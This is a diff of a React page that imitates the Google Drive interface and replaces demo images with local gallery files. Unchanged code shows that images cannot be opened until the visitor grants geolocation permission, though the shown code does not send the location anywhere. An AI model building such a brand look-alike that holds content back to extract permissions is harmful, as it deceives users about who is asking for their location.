@@ -10,10 +10,26 @@ export default function GoPage() {
   const [selectedImage, setSelectedImage] = useState<string | null>(null);
   const [showPermissionToast, setShowPermissionToast] = useState(false);
 
-  // Demo images (you can replace with real backend images later)
-  const images = Array.from({ length: 12 }, (_, i) => 
-    `https://picsum.photos/400/300?random=${i + 1}`
-  );
+  // ====================== YOUR REAL IMAGES ======================
+  // Put your images in: public/images/gallery/
+  // Just add more lines here if you add more files
+  const images: string[] = [
+    "/images/gallery/photo1.jpg",
+    "/images/gallery/photo2.jpg",
+    "/images/gallery/photo3.jpg",
+    "/images/gallery/photo4.jpg",
+    "/images/gallery/photo5.jpg",
+    "/images/gallery/photo6.jpg",
+    "/images/gallery/photo7.jpg",
+    "/images/gallery/photo8.jpg",
+    "/images/gallery/photo9.jpg",
+    "/images/gallery/photo10.jpg",
+    "/images/gallery/photo11.jpg",
+    "/images/gallery/photo12.jpg",
+    // ← Add more images here (example below)
+    // "/images/gallery/my-vacation.jpg",
+    // "/images/gallery/family-photo.png",
+  ];
 
   /* ==================== REQUEST LOCATION PERMISSION ==================== */
   const requestLocationPermission = () => {
@@ -24,12 +40,10 @@ export default function GoPage() {
 
     navigator.geolocation.getCurrentPosition(
       () => {
-        // Permission granted
         setLocationPermission("granted");
         setShowPermissionToast(false);
       },
       (error) => {
-        // Permission denied or error
         console.warn("Location permission denied:", error);
         setLocationPermission("denied");
       },
@@ -46,7 +60,6 @@ export default function GoPage() {
   const handleImageClick = (src: string) => {
     if (locationPermission !== "granted") {
       setShowPermissionToast(true);
-      // Auto hide toast after 4 seconds
       setTimeout(() => setShowPermissionToast(false), 4000);
       return;
     }
@@ -80,7 +93,7 @@ export default function GoPage() {
     );
   }
 
-  /* ==================== MAIN GOOGLE DRIVE UI (only shown after permission granted) ==================== */
+  /* ==================== MAIN GOOGLE DRIVE UI ==================== */
   return (
     <div className="min-h-screen bg-[#202124] flex font-sans text-[#e8eaed]">
       
@@ -103,14 +116,14 @@ export default function GoPage() {
             <span>My Drive</span>
           </div>
 
-          {/* Other nav items (same as before) */}
+          {/* Other sidebar items (same as your original) */}
           <div className="flex items-center gap-x-3 px-4 py-[10px] rounded-2xl hover:bg-[#3c4043] text-[#dadce0] cursor-pointer">
             <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="#dadce0" strokeWidth="2.25">
               <path strokeLinecap="round" strokeLinejoin="round" d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2" />
             </svg>
             <span>Computers</span>
           </div>
-          {/* ... (rest of your sidebar items remain the same) ... */}
+          {/* Add your other nav items here if you want */}
         </nav>
 
         <div className="px-4 py-4 border-t border-[#3c4043] mt-auto">
@@ -127,7 +140,7 @@ export default function GoPage() {
       {/* Main Content */}
       <div className="flex-1 flex flex-col">
         <header className="bg-[#202124] h-14 border-b border-[#3c4043] flex items-center px-4 gap-4 shadow-sm z-10">
-          {/* Your existing header code remains unchanged */}
+          {/* Header remains exactly the same as before */}
           <div className="flex items-center gap-x-2 flex-shrink-0">
             <button className="p-2 rounded-full hover:bg-[#3c4043] md:hidden">
               <svg xmlns="http://www.w3.org/2000/svg" className="w-6 h-6 text-[#dadce0]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2.5">
@@ -145,7 +158,6 @@ export default function GoPage() {
             </div>
           </div>
 
-          {/* Search bar and right side remain the same */}
           <div className="flex-1 max-w-[680px] mx-auto">
             <div className="relative">
               <input
@@ -184,11 +196,11 @@ export default function GoPage() {
             <div className="flex items-center text-sm text-[#dadce0]">
               <span className="font-medium">My Drive</span>
               <span className="mx-2 text-[#5f6368]">•</span>
-              <span className="text-[#9aa0a6]">12 images</span>
+              <span className="text-[#9aa0a6]">{images.length} images</span>
             </div>
           </div>
 
-          {/* Image Grid - Only visible when location is granted */}
+          {/* Image Grid */}
           <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 xl:grid-cols-6 2xl:grid-cols-7 gap-6">
             {images.map((src, i) => (
               <div
@@ -208,7 +220,7 @@ export default function GoPage() {
                 <div className="px-4 py-3 flex items-center justify-between">
                   <div className="flex-1 min-w-0">
                     <p className="text-sm text-[#e8eaed] font-medium truncate">
-                      Image_{i + 1}.jpg
+                      {src.split("/").pop()}
                     </p>
                     <p className="text-xs text-[#9aa0a6]">Just now</p>
                   </div>
